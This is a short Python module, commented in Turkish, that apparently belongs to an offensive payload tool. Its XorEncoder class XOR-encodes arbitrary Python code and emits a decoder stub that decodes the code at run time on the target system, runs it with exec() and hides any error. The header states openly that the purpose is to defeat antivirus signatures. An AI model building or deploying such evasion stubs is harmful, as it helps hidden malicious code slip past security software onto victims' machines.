# XOR (Exclusive OR) şifreleme algoritmasını kullanarak payload gizleyen modül.
# XOR, tersine çevrilebilir (symmetric) ve hızlı bir işlemdir. Antivirüs imzalarını (signature) bozmak için sıkça kullanılır.

class XorEncoder:
    """
    Basit XOR Encoder (Şifreleyici).
    
    Verilen kodu bir anahtar (key) ile XOR işlemine tabi tutar.
    Oluşturulan stub kodu, çalışma anında aynı anahtarı kullanarak veriyi çözer ve çalıştırır.
    """
    
    @staticmethod
    def encode(data: str, key: int = 123) -> str:
        """
        Verilen kaynak kodunu (string) XOR algoritması ile şifreler.
        
        Args:
            data (str): Şifrelenecek Python kodu.
            key (int, optional): Şifreleme anahtarı (0-255 arası tam sayı). Varsayılan: 123.

        Returns:
            str: Şifrelenmiş veri ve çözücü (decoder) stub kodu.
        """
        # XOR Encoding İşlemi
        encoded = []
        for char in data:
            # Her karakterin ASCII değerini al (ord) ve key ile XORla (maskele).
            encoded.append(ord(char) ^ key)
        
        # Decoder Stub (Çözücü Kod) Oluşturma:
        # Bu kod hedef sistemde çalışacak ve şifreli listeyi eski haline getirecektir.
        stub = f"""
# Şifreleme anahtarı (Encoder ile aynı olmalı)
key = {key}

# Şifrelenmiş veri (Tam sayı listesi olarak gömülür)
enc = {encoded}

# Listeyi çözme işlemi:
# 1. Her sayıyı anahtarla tekrar XORla (orijinal ASCII değerine döner).
# 2. ASCII değerini karaktere çevir (chr).
# 3. Karakterleri birleştirip string yap (join).
dec = "".join([chr(x ^ key) for x in enc])

try:
    # Çözülen orijinal kodu çalıştır.
    exec(dec)
except:
    # Hata durumunda sessiz kal.
    pass
"""
        return stub.strip()
